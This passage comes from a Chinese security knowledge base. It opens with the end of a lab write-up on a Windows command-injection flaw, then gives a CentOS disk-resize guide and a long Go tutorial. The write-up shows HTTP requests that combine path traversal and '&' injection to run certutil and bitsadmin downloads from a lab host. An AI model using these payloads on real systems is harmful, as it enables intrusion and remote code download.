Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 70 ipaddress=127.0.0.1/../../../../../../../windows/system32/ipconfig.exe 远程下载文件 这个比较鸡肋，由于路径穿越执行命令是无法带参数，带参数就会报错 但是在第第一个命令后带上&，两个命令一起执行，那么就能执行成功后面的命令 在这里将上面代码的escapeshellcmd函数去掉，添加%26，执行文件下载的命令 POST /ping.php HTTP/1.1 Host: 192.168.93.143 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 146 ipaddress=127.0.0.1/../../../../../../../windows/system32/calc%26certutil.exe /urlcache /split /f http://192.168.200.76:8080/test.txt C:\\\\test.txt bitsadmin /transfer /myDownload /download /priority normal \"http://192.168.200.76:8888/test.txt\" c:\\22.txt Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:18 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/14.Windows_CMD.exe执行任意代码、命令、程序的漏洞.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/15.CentOS7虚拟机根目录扩容（无卷组情况下）.html":{"url":"知识库/03.主机安全/15.CentOS7虚拟机根目录扩容（无卷组情况下）.html","title":"15.CentOS7虚拟机根目录扩容（无卷组情况下）","keywords":"","body":" 前言 0x1 增加虚拟磁盘容量 0x2 使用fdisk 扩容 前言 由于最近在给公司管培生做培训，需要用到Docker，原以为20个G的CentOS够用了，但是发现还是小瞧了docker的镜像，安装到一半突然告知磁盘不够，所以马上开始紧急扩容 0x1 增加虚拟磁盘容量 虚拟机正常关机后，打开此虚拟机的设置，选择硬盘 然后在磁盘大小处填写需要扩展到合适的硬盘大小量，点击应用即可 然后打开虚拟机，可以看到磁盘已经有120个G了，但是根目录只有18个G 0x2 使用fdisk 扩容 在/dev/sda 这块磁盘中，可以看到当前挂载到根目录的为/dev/sda3，其他的则为系统所需磁盘 如果需要将磁盘扩展到挂载根目录的需要将/dev/sda3 删除，然后再重新分区 [root@localhost aaron]# fdisk /dev/sda Welcome to fdisk (util-linux 2.23.2). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): p Disk /dev/sda: 128.8 GB, 128849018880 bytes, 251658240 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk label type: dos Disk identifier: 0x000ab441 Device Boot Start End Blocks Id System /dev/sda1 * 2048 616447 307200 83 Linux /dev/sda2 616448 4810751 2097152 82 Linux swap / Solaris /dev/sda3 4810752 41943039 18566144 83 Linux Command (m for help): d Partition number (1-3, default 3): 3 Partition 3 is deleted Command (m for help): n Partition type: p primary (2 primary, 0 extended, 2 free) e extended Select (default p): p Partition number (3,4, default 3): First sector (4810752-251658239, default 4810752): Using default value 4810752 Last sector, +sectors or +size{K,M,G} (4810752-251658239, default 251658239): Using default value 251658239 Partition 3 of type Linux and of size 117.7 GiB is set Command (m for help): w The partition table has been altered! Calling ioctl() to re-read partition table. WARNING: Re-reading the partition table failed with error 16: Device or resource busy. The kernel still uses the old table. The new table will be used at the next reboot or after you run partprobe(8) or kpartx(8) Syncing disks. 上述步骤执行完之后，执行lsblk，可以看到当前更改还未生效 [root@localhost Desktop]# lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 120G 0 disk ├─sda1 8:1 0 300M 0 part /boot ├─sda2 8:2 0 2G 0 part [SWAP] └─sda3 8:3 0 17.7G 0 part / sr0 11:0 1 1024M 0 rom 需要重启 reboot 重启之后执行lsblk ，可以看到此时/dev/sda3 分区的大小已经修改为117.7G了，但是我们使用df -hT查看却还是18G 下一步则需要刷新磁盘 xfs_growfs /dev/sda3 至此，磁盘扩容完毕 Ubuntu 使用xfs_growfs 无法成功 通知系统内核分区表的变化，输入：partprobe /dev/sda 对文件系统进行扩容，输入：resize2fs /dev/sda1 查看/dev/sda1是否扩容成功，输入：df -TH Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:44 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/15.CentOS7虚拟机根目录扩容（无卷组情况下）.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/01.GO基础/":{"url":"知识库/04.编程开发/01.GO/01.GO基础/","title":"01.GO基础","keywords":"","body":" 介绍 Hello World GO语言基础 工作空间 环境变量 包路径 包名 包文档 代码结构 代码编译运行 快速运行 安装到本地 远程下载并编译 交叉编译 代码测试 GO标记 标识符 关键字 行分隔符; 注释 字符串连接 格式化字符串 数据类型 数字类型 浮点型 其他数字类型 值类型和引用类型 GO开发基础 声明变量 声明常量 运算符 算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 其他运算符 运算符优先级 空白标识符 格式化输出 条件语句 if if...else if...else if...else switch select 循环语句 for for each 无限循环 循环控制 init函数 自定义函数 构造函数与复合字面 作用域 局部变量 全局变量 数组 初始化数组 访问数组 指针 使用指针 空指针 指针数组 结构体 定义结构体 访问成员 结构体作为参数 结构体指针 切片 定义切片 初始化切片 空(nil)切片 切片截取 len()和cap()函数 追加元素 append()和copy()函数 集合(Map) 定义Map 删除元素 范围(Range) 类型转换 递归 阶乘实例 斐波那契数列实例 接口 声明接口 实现接口 new和make new make defer 并发 go程 通道（channel） 通道缓冲区 注意事项 遍历通道 关闭通道 异常处理 生成error Panic异常 恢复 介绍 Go语言(Golang)最初是由Robert Griesemer, Rob Pike, 和 Ken Thompson在谷歌于2007年开发出来的编程语言。Go编程语言是静态类型语言，语法类似于C语言，它提供了垃圾收集，类型安全，动态的输入能力，还有很多先进的内置类型，例如，可变长度数组和映射（键-值对）。它还提供了丰富的标准库。 Go编程语言是在2009年11月正式对外发布，主要是应用谷歌的于一些生产系统链中。 Hello World package main import \"fmt\" func main() { fmt.Println(\"HELLO WORLD\") } go run Hello.go GO语言基础 工作空间 go工具为公共代码仓库中维护的开源代码而设计。 无论会不会公布代码，该模型设置工作环境的方法都是相同的。 Go代码必须放在工作空间内。它其实就是一个目录，其中包含三个子目录： src 目录包含Go的源文件，它们被组织成包（每个目录都对应一个包） pkg 目录包含包对象 bin 目录包含可执行命令 go 工具用于构建src目录中的源码包，并将其生成的二进制文件安装到 pkg 和 bin 目录中。 src 子目录通常包会含多种版本控制的代码仓库（例如Git或Mercurial）， 以此来跟踪一个或多个源码包的开发。 结构举例如下： bin/ hello # 可执行命令 pkg/ linux_amd64/ # 这里会反映出你的操作系统和架构 github.com/user/ stringutil.a # 包对象 src/ github.com/user/ hello/ hello.go # 命令源码 stringutil/ reverse.go # 包源码 环境变量 go env 而 GOPATH 环境变量指定了你的工作空间位置，这也是很重要的一个变量。 首先创建一个工作空间目录，并设置相应的 GOPATH，工作空间可以放在任何地方，我们使用 $HOME/go。 注意，它绝对不能和你的Go安装目录相同。（另一种常见的设置是 GOPATH=$HOME。） 设置GOPATH export GOPATH=$HOME/go 然后将bin添加到环境变量中 export PATH=$PATH:$GOPATH/bin 包路径 标准库中的包有给定的短路径，比如 \"fmt\" 和 \"net/http\"。 对于你自己的包，你必须选择一个基本路径，来保证它不会与将来添加到标准库， 或其它扩展库中的包相冲突。 如果你将你的代码放到了某处的源码库，那就应当使用该源码库的根目录作为你的基本路径。 例如，若你在 GitHub 上有账户 github.com/user 那么它就应该是你的基本路径。 我们将使用 github.com/user 作为基本路径。在你的工作空间里创建一个目录， 我们将源码存放到其中： mkdir -p $GOPATH/src/github.com/user 包名 源文件中的第一个语句必须是 package 名称 这里的 **名称** 即为导入该包时使用的默认名称。 （一个包中的所有文件都必须使用相同的 **名称**。） Go的约定是包名为导入路径的最后一个元素：作为 “crypto/rot13” 导入的包应命名为 rot13。 可执行命令必须使用 package main。 链接成单个二进制文件的所有包，其包名无需是唯一的，只有导入路径（它们的完整文件名） 才是唯一的。 包文档 1、使用命令go doc go doc fmt.Println 2、另一种比较常用的方式，是直接进去包内查看源码 代码结构 Go 语言的基础组成有以下几个部分： 包声明 引入包 函数 变量 语句 & 表达式 注释 以上面的hello world代码为例 package main // 定义了包名。必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。 import \"fmt\" // 引用fmt包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数 func main() { // 程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数） fmt.Println(\"HELLO WORLD\") // 调用fmt包中的函数，将字符串输出到控制台，并在最后自动增加换行字符 \\n } 其他： //开头的为单行注释，/*开头，并以*/结尾为多行注释 当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ） 函数名首字母小写即为 protected :func getId() {} 函数名首字母大写即为 public : func Printf() {} 代码编译运行 创建目录/Users/d4m1ts/go/src/github.com/damit5/goTest，并编写代码Hello.go，代码如上 快速运行 编写完成代码后，有两种方法可以快速运行 一种是直接动态运行 go run xxx.go 另一种则是先编译成二进制文件再手动执行 go build xxx.go 安装到本地 还有一种方法可以安装到本地，简单来说就是生成二进制文件并且放到bin目录下，如果在项目目录中就直接go install即可，在其他路径则需要带上src后的路径 go install go install github.com/damit5/goTest 无论是安装包还是二进制文件，go 工具都会安装它所依赖的任何东西 如果提示go: go.mod file not found in current directory or any parent directory; see 'go help modules'，说明需要初始化项目，执行 go mod init {项目名} 然后就可以用go install了，生成后的二进制文件自动存放在bin目录中 远程下载并编译 前提是提前上传到github中 若指定的包不在工作空间中，go get就会将会将它放到 GOPATH 指定的第一个工作空间内。（若该包已存在，go get 就会跳过远程获取， 其行为与 go install 相同） go get github.com/damit5/goTest go get -v github.com/damit5/goTest 交叉编译 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_darwin CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_linux CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_win.exe 代码测试 Go拥有一个轻量级的测试框架，它由 go test 命令和 testing 包构成。 你可以通过创建一个名字以 _test.go 结尾的，包含名为 TestXXX 且签名为 func (t *testing.T) 函数的文件来编写测试。 测试框架会运行每一个这样的函数；若该函数调用了像 t.Error 或 t.Fail 这样表示失败的函数，此测试即表示失败。 实例： package main import ( \"fmt\" \"testing\" ) func sum(a int, b int) int { return a+b } func TestSum(t *testing.T) { a := 10 b := 20 c := sum(a, b) if c == a+b { fmt.Println(\"success\") } else { t.Errorf(\"error happends\") } } 代码编写后，使用如下命令即可测试 go test go test github.com/damit5/goTest GO标记 Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。如以下 GO 语句由 6 个标记组成： fmt.Println(\"Hello, World!\") 6 个标记是(每行一个)： fmt . Println ( \"Hello, World!\" ) 标识符 标识符用来命名变量、类型等程序实体。一个标识符实际上就是一个或是多个字母( A ~ Z 和 a ~ z)数字(0~9)、下划线_组成的序列，但是第一个字符必须是字母或下划线而不能是数字。 关键字 下面列举了 Go 代码中会使用到的 25 个关键字或保留字： break default func interface select case defer go map struct chan else goto package switch const fallthrough if range type continue for import return var 除了以上介绍的这些关键字，Go 语言还有 36 个预定义标识符： append bool byte cap close complex complex64 complex128 uint16 copy false float32 float64 imag int int8 int16 uint32 int32 int64 iota len make new nil panic uint64 print println real recover string true uint uint8 uintptr 行分隔符; 在Go程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。 如果你打算将多个语句写在同一行，它们则必须使用 ; 人为区分，但在实际开发中我们并不鼓励这种做法。 注释 注释不会被编译，每一个包应该有相关注释。 // 单行注释 /* 多行注释 */ 字符串连接 和大多数语言一样，连接通过+来实现 fmt.Println(\"HELLO WORLD\\t\" + \"d4m1ts\") 格式化字符串 Go 语言中使用 fmt.Sprintf 格式化字符串并赋值给新串 package main import \"fmt\" func main() { var keyword = \"world\" var name = \"d4m1ts\" var age = 18 var template = \"hello %s %s %d\" var sentence = fmt.Sprintf(template, keyword, name, age) fmt.Println(sentence) } // hello world d4m1ts 18 数据类型 序号 类型和描述 1 布尔型布尔型的值只可以是常量 true 或者 false。一个简单的例子：var b bool = true 。 | | 2 | 数字类型整型 int 和浮点型 float32、float64，Go 语言支持整型和浮点型数字，并且支持复数，其中位的运算采用补码。 | | 3 | 字符串类型:字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。 | | 4 | 派生类型:包括： (a) 指针类型（Pointer） (b) 数组类型 (c) 结构化类型(struct) (d) Channel 类型 (e) 函数类型 (f) 切片类型 (g) 接口类型（interface） (h) Map 类型 | 数字类型 Go 也有基于架构的类型，例如：int、uint 和 uintptr。 序号 类型和描述 1 uint8 无符号 8 位整型 (0 到 255) 2 uint16 无符号 16 位整型 (0 到 65535) 3 uint32 无符号 32 位整型 (0 到 4294967295) 4 uint64 无符号 64 位整型 (0 到 18446744073709551615) 5 int8 有符号 8 位整型 (-128 到 127) 6 int16 有符号 16 位整型 (-32768 到 32767) 7 int32 有符号 32 位整型 (-2147483648 到 2147483647) 8 int64 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807) 浮点型 序号 类型和描述 1 float32 IEEE-754 32位浮点型数 2 float64 IEEE-754 64位浮点型数 3 complex64 32 位实数和虚数 4 complex128 64 位实数和虚数 其他数字类型 以下列出了其他更多的数字类型： 序号 类型和描述 1 byte 类似 uint8 2 rune 类似 int32 3 uint 32 或 64 位 4 int 与 uint 一样大小 5 uintptr 无符号整型，用于存放一个指针 值类型和引用类型 值类型是单独记录在内存中的，每2个数据都是独立的，其中一个修改不会影响到另一个 引用类型记录的是指针地址，如果2个数据指向同一个地址，那么其中一个被修改了，另一个也会被修改 所有像 int、float、bool 和 string 这些基本类型都属于值类型，使用这些类型的变量直接指向存在内存中的值 当使用等号 = 将一个变量的值赋值给另一个变量时，如：j = i，实际上是在内存中将 i 的值进行了拷贝，可以通过 &i 来获取变量 i 的内存地址 而更复杂的数据通常会需要使用多个字，这些数据一般使用引用类型保存。 一个引用类型的变量 r1 存储的是 r1 的值所在的内存地址（数字），或内存地址中第一个字所在的位置 这个内存地址称之为指针，这个指针实际上也被存在另外的某一个值中。 同一个引用类型的指针指向的多个字可以是在连续的内存地址中（内存布局是连续的），这也是计算效率最高的一种存储形式；也可以将这些字分散存放在内存中，每个字都指示了下一个字所在的内存地址。 当使用赋值语句 r2 = r1 时，只有引用（地址）被复制。 如果 r1 的值被改变了，那么这个值的所有引用都会指向被修改后的内容，在这个例子中，r2 也会受到影响。 GO开发基础 声明变量 变量名由字母、数字、下划线组成，其中首个字符不能为数字。 声明变量的一般形式是使用 var 关键字： 语法： // 标准语法 var identifier type // 也可以同时声明多个变量 var identifier1, identifier2 type // 1. 指定变量类型，如果没有初始化，则变量默认为零值（没有做初始化时系统默认设置的值） var a int // 0 var b bool // false var c string // \"\" var a []int // nil // 2. 没有指定变量类型，则根据值自行判定变量类型 var d = true // 自动识别为bool // 3. 使用 := 可以快速声明变量 /* := 等价于 var name string; name = \"d4m1ts\" 这种格式只能在函数体中出现 */ name := \"d4m1ts\" // 4. 如果变量已经使用 var 声明过了，再使用 := 声明变量，就产生编译错误 var name = \"d4m1ts\" name := \"d4m1ts\" 单变量声明实例： var a,b int8 a = 1 b = 2 var name = \"d4m1ts\" name1 := \"d4m1ts\" 多变量声明实例： var a,b int = 1,2 c,d := 3,4 任意变量： 如果想接受任意类型的变量，可以用interface 比如var jsonData []map[string]interface{} package main import ( \"fmt\" ) func init() { fmt.Print(\"init\") } func main() { test1(\"123\") test1(1) test2(\"123\",1, \"324\", 12) } // 实现传单个任何类型的参数 func test1(v interface{}) { fmt.Println(v) // 打印 “123” 1 } // 实现传任意多个任意类型的参数 func test2(v ...interface{}) { for _, m := range v { fmt.Println(m) // 依次打印 123 1 324 12 } } interface{}转string var a interface{} a.(string) 声明常量 常量是一个简单值的标识符，在程序运行时，不会被修改的量，一般形式是使用 const 关键字。 常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。 语法： 和变量一样，type可以省略 显式类型定义： const b string = \"abc\" 隐式类型定义： const b = \"abc\"const identifier [type] = value 定义实例：const j = 4 const i,j = 3,4 用作枚举：package main import ( \"fmt\" \"unsafe\" ) func main() { const ( a = \"abc\" b = len(a) c = unsafe.Sizeof(b) ) fmt.Println(c) } // 8 iota： 特殊常量，可以认为是一个可以被编译器修改的常量 iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。package main import \"fmt\" func main() { const ( a = iota //0 b //1 c //2 d = \"ha\" //独立值，iota += 1 e //\"ha\" iota += 1 f = 100 //iota +=1 g //100 iota +=1 h = iota //7,恢复计数 i //8 ) fmt.Println(a,b,c,d,e,f,g,h,i) } // 0 1 2 ha ha 100 100 7 8 运算符 算术运算符 下表列出了所有Go语言的算术运算符。假定 A 值为 10，B 值为 20。 运算符 描述 实例 + 相加 A + B 输出结果 30 - 相减 A - B 输出结果 -10 * 相乘 A * B 输出结果 200 / 相除 B / A 输出结果 2 % 求余 B % A 输出结果 0 ++ 自增 A++ 输出结果 11 -- 自减 A-- 输出结果 9 关系运算符 下表列出了所有Go语言的关系运算符。假定 A 值为 10，B 值为 20。 运算符 描述 实例 == 检查两个值是否相等，如果相等返回 True 否则返回 False。 (A == B) 为 False != 检查两个值是否不相等，如果不相等返回 True 否则返回 False。 (A != B) 为 True > 检查左边值是否大于右边值，如果是返回 True 否则返回 False。 (A > B) 为 False 检查左边值是否小于右边值，如果是返回 True 否则返回 False。 (A >= 检查左边值是否大于等于右边值，如果是返回 True 否则返回 False。 (A >= B) 为 False 检查左边值是否小于等于右边值，如果是返回 True 否则返回 False。 (A 逻辑运算符 下表列出了所有Go语言的逻辑运算符。假定 A 值为 True，B 值为 False。 运算符 描述 实例 && 逻辑 AND 运算符。 如果两边的操作数都是 True，则条件 True，否则为 False。 (A && B) 为 False || 逻辑 OR 运算符。 如果两边的操作数有一个 True，则条件 True，否则为 False。 (A || B) 为 True ! 逻辑 NOT 运算符。 如果条件为 True，则逻辑 NOT 条件 False，否则为 True。 !(A && B) 为 True 位运算符 位运算符对整数在内存中的二进制位进行操作。 下表列出了位运算符 &, |, 和 ^ 的计算： p q p & q p | q p ^ q 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 Go 语言支持的位运算符如下表所示。假定 A 为60，B 为13： 运算符 描述 实例 & 按位与运算符\"&\"是双目运算符。 其功能是参与运算的两数各对应的二进位相与。 (A & B) 结果为 12, 二进制为 0000 1100 | 按位或运算符\"|\"是双目运算符。 其功能是参与运算的两数各对应的二进位相或 (A | B) 结果为 61, 二进制为 0011 1101 ^ 按位异或运算符\"^\"是双目运算符。 其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。 (A ^ B) 结果为 49, 二进制为 0011 0001 左移运算符\" A >> 右移运算符\">>\"是双目运算符。右移n位就是除以2的n次方。 其功能是把\">>\"左边的运算数的各二进位全部右移若干位，\">>\"右边的数指定移动的位数。 A >> 2 结果为 15 ，二进制为 0000 1111 赋值运算符 下表列出了所有Go语言的赋值运算符。 运算符 描述 实例 = 简单的赋值运算符，将一个表达式的值赋给一个左值 C = A + B 将 A + B 表达式结果赋值给 C += 相加后再赋值 C += A 等于 C = C + A -= 相减后再赋值 C -= A 等于 C = C - A *= 相乘后再赋值 C = A 等于 C = C A /= 相除后再赋值 C /= A 等于 C = C / A %= 求余后再赋值 C %= A 等于 C = C % A 左移后赋值 C >>= 右移后赋值 C >>= 2 等于 C = C >> 2 &= 按位与后赋值 C &= 2 等于 C = C & 2 ^= 按位异或后赋值 C ^= 2 等于 C = C ^ 2 |= 按位或后赋值 C |= 2 等于 C = C | 2 其他运算符 下表列出了Go语言的其他运算符。 运算符 描述 实例 & 返回变量存储地址 &a; 将给出变量的实际地址。 * 指针变量。 *a; 是一个指针变量 运算符优先级 有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低： 优先级 运算符 5 * / % > & &^ 4 + - | ^ 3 == != >= 2 && 1 || 空白标识符 用 _ 可以代表被丢弃的值，避免一些变量因为没使用导致程序报错 实例： 变量j必须使用，否则会报错 package main import \"fmt\" func main() { a := [] int {1,2,3,4,5} for j,i := range a { fmt.Println(j, i) } } 使用_来丢弃上面的j变量 package main import \"fmt\" func main() { a := [] int {1,2,3,4,5} for _,i := range a { fmt.Println(i) } } 格式化输出 Go采用的格式化打印风格和C的 printf 族类似，但却更加丰富而通用。 这些函数位于 fmt 包中，且函数名首字母均为大写：如 fmt.Printf、fmt.Fprintf，fmt.Sprintf 等。 字符串函数（Sprintf 等）会返回一个字符串，而非填充给定的缓冲区。 常见格式 var t interface{} t = functionOfSomeType() switch t := t.(type) { default: fmt.Printf(\"unexpected type %T\", t) // %T 输出 t 是什么类型 case bool: fmt.Printf(\"boolean %t\\n\", t) // t 是 bool 类型 case int: fmt.Printf(\"integer %d\\n\", t) // t 是 int 类型 case *bool: fmt.Printf(\"pointer to boolean %t\\n\", *t) // t 是 *bool 类型 case *int: fmt.Printf(\"pointer to integer %d\\n\", *t) // t 是 *int 类型 } 通用格式 package main import ( \"fmt\" ) type structTest struct { name string age int } func main() { a := structTest{ name: \"d4m1ts\", age: 18, } fmt.Printf(\"123 %v 456\\n\", \"aa\") // 123 aa 456 fmt.Printf(\"123 %v 456\\n\", a) // 123 {d4m1ts 18} 456 fmt.Printf(\"123 %+v 456\\n\", a) // 123 {name:d4m1ts age:18} 456 fmt.Printf(\"123 %#v 456\\n\", a) // 123 main.structTest{name:\"d4m1ts\", age:18} 456 } // 通用的格式 %v（对应“值”），这种格式还能打印任意值，甚至包括数组、结构体和映射。 // 当打印结构体时，改进的格式 %+v 会为结构体的每个字段添上字段名，而另一种格式 %#v 将完全按照Go的语法打印值。 条件语句 注意大括号{的位置，不能单独一行！！！ if package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 5){ fmt.Println(name) } } if...else package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 10){ fmt.Println(name) } else { fmt.Println(\"NONONO\") } } if...else if...else package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 10){ fmt.Println(name) } else if (len(name) == 6) { fmt.Println(name, \"==6\") } else { fmt.Println(\"NONONO\") } } switch package main import \"fmt\" func main() { name := \"d4m1ts\" switch { case len(name) > 5: fmt.Print(\">5\") case len(name) select select 是 Go 中的一个控制结构，类似于用于通信的 switch 语句。每个 case 必须是一个通信操作，要么是发送要么是接收。 select 随机执行一个可运行的 case。如果没有 case 可运行，它将阻塞，直到有 case 可运行。一个默认的子句应该总是可运行的。 语法: Go 编程语言中 select 语句的语法如下： select { case communication clause : statement(s); case communication clause : statement(s); /* 你可以定义任意数量的 case */ default : /* 可选 */ statement(s); } 以下描述了 select 语句的语法： 每个 case 都必须是一个通信 所有 channel 表达式都会被求值 所有被发送的表达式都会被求值 如果任意某个通信可以进行，它就执行，其他被忽略。 如果有多个 case 都可以运行，Select 会随机公平地选出一个执行。其他不会执行。否则： 如果有 default 子句，则执行该语句。 如果没有 default 子句，select 将阻塞，直到某个通信可以运行；Go 不会重新对 channel 或值进行求值。 实例： package main import \"fmt\" func main() { var c1, c2, c3 chan int var i1, i2 int select { case i1 = 循环语句 for 语法： 共有3种语法，分别是 // 1.和 C 语言的 for 一样 for init; condition; post { } // 2.和 C 的 while 一样 for condition { } // 3.while true，需要手动break for { } init： 一般为赋值表达式，给控制变量赋初值； condition： 关系表达式或逻辑表达式，循环控制条件； post： 一般为赋值表达式，给控制变量增量或减量。 实例： package main import \"fmt\" func main() { sum := 0 // 1 ==> 10 for i:=0; i 40 for sum 160 for { sum += sum if sum > 100{ break } } fmt.Println(sum) } for each 严格来说是 for each range 循环 package main import \"fmt\" func main() { ab := []string {\"aaa\", \"bbb\"} for i,s := range ab{ fmt.Println(i ,s) } } /* 0 aaa 1 bbb */ 无限循环 package main import \"fmt\" func main() { for true { fmt.Println(\"1\") } } 循环控制 就是让循环停止或者跳过此次循环 break 经常用于中断当前 for 循环或跳出 switch 语句 continue 跳过当前循环的剩余语句，然后继续进行下一轮循环。 goto 将控制转移到被标记的语句。 goto见比较少，举个例子吧 package main import \"fmt\" func main() { a := 10 LOOP: for a init函数 每个源文件都可以通过定义自己的无参数 init 函数来设置一些必要的状态。（其实每个文件都可以拥有多个 init 函数。）而它的结束就意味着初始化结束：只有该包中的所有变量声明都通过它们的初始化器求值后 init 才会被调用， 而那些init 只有在所有已导入的包都被初始化后才会被求值。 除了那些不能被表示成声明的初始化外，init 函数还常被用在程序真正开始执行前，检验或校正程序的状态。 package main import \"fmt\" func init() { fmt.Println(\"init ...\") } func main() { fmt.Println(\"main ...\") } /* init ... main ... */ 自定义函数 语法： func function_name( [parameter list] ) [return_types] { 函数体 } 函数定义解析： func：函数由 func 开始声明 function_name：函数名称，参数列表和返回值类型构成了函数签名。 parameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。 return_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。 函数体：函数定义的代码集合。 实例： 选出2个数中最大的 package main import \"fmt\" func main() { fmt.Println(max(5,9 )) } func max (a int, b int) int { if a > b { return a } else { return b } } 返回多个值 package main import \"fmt\" func main() { fmt.Println(max(5,9 )) } func max (a int, b int) (int,int) { if a > b { return a,b } else { return b,a } } 引用传递值 传入的是地址，函数内值被修改，函数外也会受影响 package main import \"fmt\" func main() { a := 66 test(&a) fmt.Println(a) } func test(a *int) { fmt.Println(*a) *a += 10 fmt.Println(*a) } /* 66 76 76 */ 构造函数与复合字面 有时零值还不够好，这时就需要一个初始化构造函数，如来自 os 包中的这段代码所示。 func NewFile(fd int, name string) *File { if fd 这里显得代码过于冗长。我们可通过复合字面来简化它， 该表达式在每次求值时都会创建新的实例 func NewFile(fd int, name string) *File { if fd 作用域 局部变量 在函数体内声明的变量称之为局部变量，它们的作用域只在函数体内，参数和返回值变量也是局部变量。 全局变量 在函数体外声明的变量称之为全局变量，全局变量可以在整个包甚至外部包（被导出后）使用； 全局变量可以在任何函数中使用 全局变量与局部变量名称可以相同，但是函数内的局部变量会被优先考虑 实例： package main import \"fmt\" var global string = \"全局变量\" func main() { fmt.Println(global) } 数组 初始化数组 如果数组长度不确定，可以使用 ... 代替数组的长度，编译器会根据元素个数自行推断数组的长度（也可以使用切片） 初始化数组中 {} 中的元素个数不能大于 [] 中的数字 语法： var variable_name [SIZE] variable_type var balance [10] float32 实例： package main import \"fmt\" func main() { var a [10] string var b = [...] int {1,2,3,4,5} c := [] string {\"aa\", \"bb\", \"cc\"} // 切片 fmt.Println(a) fmt.Println(b) fmt.Println(c) } 访问数组 数组元素可以通过索引（位置）来读取。格式为数组名后加中括号，中括号中为索引的值。 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} fmt.Println(c[0]) for i,s := range c { fmt.Println(i, s) } } 指针 使用指针 会C的指针，这个就很简单了 取地址符是&，放到一个变量前使用就会返回相应变量的内存地址 取值符是*，放到一个内存地址前使用就会返回相应变量的值 package main import \"fmt\" func main() { a := 1 // 实际变量 var ip *int // 指针变量 ip = &a fmt.Println(\"a的值：\", a) fmt.Println(\"a的地址：\", &a) fmt.Printf(\"a的地址：%x\", ip) } 空指针 当一个指针被定义后没有分配到任何变量时，它的值为 nil。 nil 指针也称为空指针。 nil在概念上和其它语言的null、None、nil、NULL一样，都指代零值或空值。 一个指针变量通常缩写为 ptr package main import \"fmt\" func main() { var ptr *int // 指针变量 fmt.Printf(\"ptr空指针地址：%x\", ptr) } // 0 判断空指针 if(ptr != nil) /* ptr 不是空指针 */ if(ptr == nil) /* ptr 是空指针 */ 指针数组 有一种情况，我们可能需要保存数组，这样我们就需要使用到指针 package main import \"fmt\" func main() { var a = [] int {1,2,3} var ptr [3] *int for i,s := range a { ptr[i] = &s } fmt.Println(ptr) // [0xc000198000 0xc000198000 0xc000198000] for i,s := range ptr { fmt.Println(i, *s) } } ptr 为整型指针数组，因此每个元素都指向了数组中第一个值的地址 结构体 